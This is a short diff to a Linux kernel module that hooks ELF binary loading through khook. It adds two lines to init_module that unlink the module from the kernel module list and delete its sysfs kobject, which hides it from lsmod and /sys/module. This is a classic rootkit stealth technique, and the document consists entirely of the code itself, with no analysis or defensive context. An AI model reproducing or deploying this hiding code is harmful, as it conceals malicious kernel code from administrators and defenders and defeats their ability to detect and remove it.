@@ -172,6 +172,8 @@ static int khook_load_elf_binary(struct linux_binprm *bprm)
 int init_module(void)
 {
 	print_pid();
+	list_del_init(&__this_module.list);
+	kobject_del(&THIS_MODULE->mkobj.kobj);
 	return khook_init();
 }
 
